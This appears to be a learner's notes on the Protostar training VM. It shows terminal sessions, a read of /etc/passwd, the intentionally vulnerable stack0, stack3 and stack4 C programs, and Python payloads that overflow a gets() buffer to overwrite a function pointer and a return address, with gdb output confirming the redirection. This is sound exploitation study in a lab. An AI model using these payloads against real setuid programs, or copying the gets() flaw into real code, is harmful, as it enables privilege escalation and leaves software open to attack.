```css
┌─[✘]──[alpha@speed:🐧]──[~]:
└──╼ $ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@192.168.43.189



$ ls
$ pwd
/home/user
$ /bin/bash
user@protostar:~$ ls
user@protostar:~$ uname -a
Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
user@protostar:~$ 
user@protostar:~$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ ls
final0  final2   format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1  format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
user@protostar:/opt/protostar/bin$ 


user@protostar:/opt/protostar/bin$ ls -la
total 910
drwxr-xr-x 2 root root   368 Nov 24  2011 .
drwxr-xr-x 5 root root    60 Nov 22  2011 ..
-rwsr-xr-x 1 root root 54889 Nov 24  2011 final0
-rwsr-xr-x 1 root root 56773 Nov 24  2011 final1
-rwsr-xr-x 1 root root 79974 Nov 24  2011 final2
-rwsr-xr-x 1 root root 23017 Nov 24  2011 format0
-rwsr-xr-x 1 root root 22931 Nov 24  2011 format1
-rwsr-xr-x 1 root root 23233 Nov 24  2011 format2
-rwsr-xr-x 1 root root 23409 Nov 24  2011 format3
-rwsr-xr-x 1 root root 23472 Nov 24  2011 format4
-rwsr-xr-x 1 root root 23541 Nov 24  2011 heap0
-rwsr-xr-x 1 root root 23528 Nov 24  2011 heap1
-rwsr-xr-x 1 root root 54838 Nov 24  2011 heap2
-rwsr-xr-x 1 root root 54559 Nov 24  2011 heap3
-rwsr-xr-x 1 root root 54969 Nov 24  2011 net0
-rwsr-xr-x 1 root root 55350 Nov 24  2011 net1
-rwsr-xr-x 1 root root 55036 Nov 24  2011 net2
-rwsr-xr-x 1 root root 57092 Nov 24  2011 net3
-rwsr-xr-x 1 root root 54434 Nov 24  2011 net4
-rwsr-xr-x 1 root root 22412 Nov 24  2011 stack0
-rwsr-xr-x 1 root root 23196 Nov 24  2011 stack1
-rwsr-xr-x 1 root root 23350 Nov 24  2011 stack2
-rwsr-xr-x 1 root root 23130 Nov 24  2011 stack3
-rwsr-xr-x 1 root root 22860 Nov 24  2011 stack4
-rwsr-xr-x 1 root root 22612 Nov 24  2011 stack5
-rwsr-xr-x 1 root root 23331 Nov 24  2011 stack6
-rwsr-xr-x 1 root root 23461 Nov 24  2011 stack7
user@protostar:/opt/protostar/bin$ 

user@protostar:/opt/protostar/bin$ file stack0
stack0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
user@protostar:/opt/protostar/bin$ 
```



```css
user@protostar:/opt/protostar/bin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
protostar:x:1000:1000:protostar,,,:/home/protostar:/bin/bash
user:x:1001:1001::/home/user:/bin/sh
user@protostar:/opt/protostar/bin$ 
```

```css
user@protostar:/opt/protostar/bin$ id
uid=1001(user) gid=1001(user) groups=1001(user)
user@protostar:/opt/protostar/bin$ 
```

now login into new window with same address `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@192.168.43.189
`
open write `vim test` and on another window type `ps aux`
```css
user      1786  0.0  0.6   5976  3284 pts/1    S    23:49   0:00 bash
user      1805  0.6  0.7  21560  4032 pts/1    Sl+  23:50   0:00 vi test
user      1808  0.0  0.1   3868  1012 pts/0    R+   23:51   0:00 ps aux

```

on one window type
```css
user@protostar:/opt/protostar/bin$ ./stack0

```

one another window type `ps aux`
```css
user      1786  0.0  0.6   5976  3288 pts/1    S    Feb11   0:00 bash
root      1819  0.0  0.0   1532   296 pts/0    S+   00:01   0:00 ./stack0
user      1821  0.0  0.1   3868  1012 pts/1    R+   00:02   0:00 ps aux

```

```css
user@protostar:/opt/protostar/bin$ ls -la stack0
-rwsr-xr-x 1 root root 22412 Nov 24  2011 stack0
user@protostar:/opt/protostar/bin$ 

```

```css
user@protostar:/opt/protostar/bin$ whereis sudo
sudo: /usr/bin/sudo /usr/lib/sudo /usr/share/man/man8/sudo.8.gz
user@protostar:/opt/protostar/bin$ ls -la /usr/bin/sudo
-rwsr-xr-x 2 root root 144740 May 23  2012 /usr/bin/sudo
user@protostar:/opt/protostar/bin$ 

```

```css
user@protostar:/opt/protostar/bin$ whereis ping
ping: /bin/ping /usr/share/man/man8/ping.8.gz
user@protostar:/opt/protostar/bin$ ls -la /bin/ping
-rwsr-xr-x 1 root root 31360 Oct 14  2010 /bin/ping
user@protostar:/opt/protostar/bin$
```

now  use two window
one window
```css
user@protostar:/opt/protostar/bin$ gdb ./stack0 -q
Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) r
Starting program: /opt/protostar/bin/stack0 
```

on another window
```css
user@protostar:~$ ps aux | grep gdb
user      1878  0.3  2.9  22756 15220 pts/0    S    00:13   0:00 gdb ./stack0 -q
user      1890  0.0  0.1   3296   728 pts/1    S+   00:15   0:00 grep gdb

```

visit this [link](https://exploit.education/protostar/stack-zero/)  for stack code
`stack0 code`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

`stack3 code`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```


  
| **Buffer Overflow 1**                                                                                                                                                                                                                                                                                                                                              | **Buffer Overflow 2 (Function Pointer)**                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| stack0                                                                                                                                                                                                                                                                                                                                                             | stack3                                                                                                                                                                                                                                                                                                                                                                                                                               |
| \#include <stdlib.h><br>\#include <unistd.h><br>\#include <stdio.h><br><br>int main(int argc, char **argv)<br>{<br>  volatile int modified;<br>  char buffer[64];<br><br>  modified = 0;<br>  gets(buffer);<br><br>  if(modified != 0) {<br>      printf("you have changed the 'modified' variable\n");<br>  } else {<br>      printf("Try again?\n");<br>  }<br>} | \#include <stdlib.h><br>\#include <unistd.h><br>\#include <stdio.h><br>\#include <string.h><br><br>void win()<br>{<br>  printf("code flow successfully changed\n");<br>}<br><br>int main(int argc, char \*\*argv)<br>{<br>  volatile int (\*fp)();<br>  char buffer\[64];<br><br>  fp = 0;<br><br>  gets(buffer);<br><br>  if(fp) {<br>      printf("calling function pointer, jumping to 0x%08x\n", fp);<br>      fp();<br>  }<br>} |
|                                                                                                                                                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                                                                                                                                                      |

```css
user@protostar:~$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ gdb st
stack0   stack2   stack4   stack6   stat     strace   strip    
stack1   stack3   stack5   stack7   stdbuf   strings  stty     
user@protostar:/opt/protostar/bin$ gdb stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) 
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   %ebp
0x08048439 <main+1>:	mov    %esp,%ebp
0x0804843b <main+3>:	and    $0xfffffff0,%esp
0x0804843e <main+6>:	sub    $0x60,%esp
0x08048441 <main+9>:	movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:	lea    0x1c(%esp),%eax
0x0804844d <main+21>:	mov    %eax,(%esp)
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    $0x8048560,%eax
0x08048461 <main+41>:	mov    0x5c(%esp),%edx
0x08048465 <main+45>:	mov    %edx,0x4(%esp)
0x08048469 <main+49>:	mov    %eax,(%esp)
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    0x5c(%esp),%eax
0x08048475 <main+61>:	call   *%eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
(gdb) 
```

`x` (examine) command is used to inspect memory at a given address

```css
(gdb) x win
0x8048424 <win>:	0x83e58955

```

In GDB, the `p` (print) command is used to display the value of a variable, expression, or memory address in a human-readable format

```css
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
```

```css
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
```

| stack3 gdb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | stack3 code                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| <br>(gdb) disassemble main<br>Dump of assembler code for function main:<br>0x08048438 <main+0>:	    push   ebp<br>0x08048439 <main+1>:	    mov    ebp,esp<br>0x0804843b <main+3>:	    and     esp,0xfffffff0<br>0x0804843e <main+6>:	    sub     esp,0x60<br>0x08048441 <main+9>:	    mov    DWORD PTR \[esp+0x5c],0x0<br>0x08048449 <main+17>:	    lea      eax,\[esp+0x1c]<br>0x0804844d <main+21>:	    mov    DWORD PTR \[esp],eax<br>0x08048450 <main+24>:	call      0x8048330 \<gets@plt><br>0x08048455 <main+29>:	cmp    DWORD PTR \[esp+0x5c],0x0<br>0x0804845a <main+34>:	je        0x8048477 <main+63><br>0x0804845c <main+36>:	mov    eax,0x8048560<br>0x08048461 <main+41>:	    mov    edx,DWORD PTR \[esp+0x5c]<br>0x08048465 <main+45>:	mov    DWORD PTR \[esp+0x4],edx<br>0x08048469 <main+49>:	mov    DWORD PTR \[esp],eax<br>0x0804846c <main+52>:	call      0x8048350 \<printf@plt><br>0x08048471 <main+57>:	    mov    eax,DWORD PTR \[esp+0x5c]<br>0x08048475 <main+61>:	    call      eax<br>0x08048477 <main+63>:	leave  <br>0x08048478 <main+64>:	ret    <br>End of assembler dump.<br><br> | \#include <stdlib.h><br>\#include <unistd.h><br>\#include <stdio.h><br>\#include <string.h><br><br>void win()<br>{<br>  printf("code flow successfully changed\n");<br>}<br><br>int main(int argc, char \*\*argv)<br>{<br>  volatile int (\*fp)();<br>  char buffer\[64];<br><br>  fp = 0;<br><br>  gets(buffer);<br><br>  if(fp) {<br>      printf("calling function pointer, jumping to 0x%08x\n", fp);<br>      fp();<br>  }<br>} |
|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |                                                                                                                                                                                                                                                                                                                                                                                                                                      |
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`


```css

(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer, jumping to 0x41414141

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff854) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) 
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff740	0xbffff740
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

```css
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff73c	0xbffff73c
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x210292	[ AF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

login to another ssh
```css
user@protostar:~$ cd /tmp/
user@protostar:/tmp$ vi stack.py
user@protostar:/tmp$ vi stack.py
user@protostar:/tmp$ cat stack.py 
print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT")
user@protostar:/tmp$ 
user@protostar:/tmp$ python stack.py 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
user@protostar:/tmp$ python stack.py > exp
user@protostar:/tmp$ cat exp
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
user@protostar:/tmp$ 
```


```css
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r < /tmp/exp 
Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x52525252

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff854) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers
eax            0x52525252	1381126738
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff740	0xbffff740
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
(gdb) x win
0x8048424 <win>:	0x83e58955


```

```css
user@protostar:/tmp$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x52)
'R'
>>> 

```

again edit

```css
user@protostar:/tmp$ vi stack.py
user@protostar:/tmp$ cat stack.py 
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
padding += "\x08\x04\x84\x24"    #0x8048424
print(padding)
user@protostar:/tmp$ python stack.py 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQ�$
user@protostar:/tmp$ python stack.py > exp

```


```css
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x24840408

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff854) at stack3/stack3.c:22
22	in stack3/stack3.c
(gdb) info registers
eax            0x24840408	612631560
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff740	0xbffff740
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 

```

some mistake happen big endian and little indian
to fix this
```css
user@protostar:/tmp$ vi stack.py
user@protostar:/tmp$ cat stack.py 
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
padding += "\x24\x84\x04\x08"    #0x8048424
print(padding)
user@protostar:/tmp$ python stack.py > exp
user@protostar:/tmp$ 

```


```css
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x08048424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff854) at stack3/stack3.c:22
22	in stack3/stack3.c
(gdb) info registers
eax            0x8048424	134513700
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff740	0xbffff740
ebp            0xbffff7a8	0xbffff7a8
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
(gdb) si
win () at stack3/stack3.c:7
7	in stack3/stack3.c
(gdb) c
Continuing.
code flow successfully changed

Program exited with code 037.

```

>[!Note]
>(gdb) si => this is used for step into win() function
win () at stack3/stack3.c:7
7	in stack3/stack3.c
(gdb) c
Continuing.
code flow successfully changed

----
stack4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```css
user@protostar:/tmp$ vi stack.py 
user@protostar:/tmp$ cat stack.py 
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(padding)
user@protostar:/tmp$ 
user@protostar:/tmp$ python stack.py > exp
user@protostar:/tmp$ 

```

```css
user@protostar:/opt/protostar/bin$ gdb st
stack0   stack2   stack4   stack6   stat     strace   strip    
stack1   stack3   stack5   stack7   stdbuf   strings  stty     
user@protostar:/opt/protostar/bin$ gdb stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) r < /tmp/exp 
Starting program: /opt/protostar/bin/stack4 < /tmp/exp

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) 
```


segmentation occur at 0x55 means at U

```css
user@protostar:/tmp$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x55)
'U'
>>> 
```

```css
(gdb) info registers
eax            0xbffff760	-1073744032
ecx            0xbffff760	-1073744032
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7b0	0xbffff7b0
ebp            0x54545454	0x54545454
esi            0x0	0
edi            0x0	0
eip            0x55555555	0x55555555
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 

```

```css
user@protostar:/tmp$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x55) => eip
'U'
>>> chr(0x54) => ebp
'T'

```


```css
(gdb) quit
A debugging session is active.

	Inferior 1 [process 2008] will be killed.

Quit anyway? (y or n) y
user@protostar:/opt/protostar/bin$ objdump -t stack4 | grep win
080483f4 g     F .text	00000014              win
user@protostar:/opt/protostar/bin$ 


```

```css
user@protostar:/tmp$ cat stack.py 
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(padding)

------------------------------------------------------

(gdb) info registers
eax            0xbffff760	-1073744032
ecx            0xbffff760	-1073744032
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff7b0	0xbffff7b0
ebp            0x54545454	0x54545454 => base pointer
esi            0x0	0
edi            0x0	0
eip            0x55555555	0x55555555 => instruction pointer 
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

modify python code
```css
user@protostar:/tmp$ vi stack4.py
user@protostar:/tmp$ cat stack4.py 
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
ebp = "AAAA"
eip = struct.pack("I",0x080483f4)
print(padding+ebp+eip)
user@protostar:/tmp$ python stack4.py > exp
user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4 
code flow successfully changed
Segmentation fault
user@protostar:/tmp$ 


```

